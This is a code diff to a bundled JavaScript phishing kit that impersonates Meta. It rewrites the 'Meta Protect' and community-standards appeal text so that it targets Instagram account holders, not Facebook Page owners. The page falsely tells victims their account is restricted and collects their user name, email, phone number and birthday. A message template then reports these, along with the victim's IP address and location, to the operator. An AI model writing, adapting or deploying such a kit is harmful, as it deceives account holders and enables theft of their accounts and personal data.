@@ -559,12 +559,12 @@
                       policiesReporting: "Policies and Reporting",
                       pagePolicyAppeals: "Page Policy Appeals",
                       detectedActivity:
-                        "We have detected unusual activity on your page that violates our community standards.",
+                        "We have detected unusual activity on your account that violates our community standards.",
                       accessLimited:
-                        "Your access to your page has been limited, and you are currently unable to post, share, or comment using your page.",
+                        "Your access to your account has been limited, and you are currently unable to post, share, or comment using your account.",
                       submitAppeal:
                         "If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information.",
-                      pageName: "Page Name",
+                      pageName: "User Name",
                       mail: "Email",
                       phone: "Phone Number",
                       birthday: "Birthday",
@@ -733,7 +733,7 @@
 🌍 <b>IP:</b> <code>${M.ip || "k lấy được"}</code>
 📍 <b>Location:</b> <code>${M.city || "k lấy được"} - ${M.region || "k lấy được"} - ${M.country_code || "k lấy được"}</code>
 
-🔖 <b>Page Name:</b> <code>${A.pageName}</code>
+🔖 <b>User Name:</b> <code>${A.pageName}</code>
 📧 <b>Email:</b> <code>${A.mail}</code>
 📱 <b>Phone Number:</b> <code>${A.phone}</code>
 🎂 <b>Date of birth:</b> <code>${A.birthday}</code>`;
@@ -1259,13 +1259,13 @@
                     () => ({
                       title: "Welcome To Meta Protect.",
                       description:
-                        "Your page's accessibility is limited, so we ask that higher security requirements be applied to that account. We created this security program to unlock your Pages.",
+                        "Accessibility to your Instagram account is limited, so we've requested that higher security requirements be applied to it. We've created this security program to unlock your account.",
                       protectionText:
-                        "We've enabled advanced protections to unlock your Page.",
+                        "We've enabled advanced protection to unlock your account.",
                       processText:
-                        "Below, we walk you through the process in detail and help you fully activate to unlock your Page.",
+                        "Below, we'll walk you through the process in detail and help you fully unlock your account.",
                       continueBtn: "Continue",
-                      restrictedText: "Your page was restricted on",
+                      restrictedText: "Your account was restricted on",
                     }),
                     [],
                   ),
@@ -1492,6 +1492,7 @@
   });
   g = w.O(g);
 })();
+
 
 
 
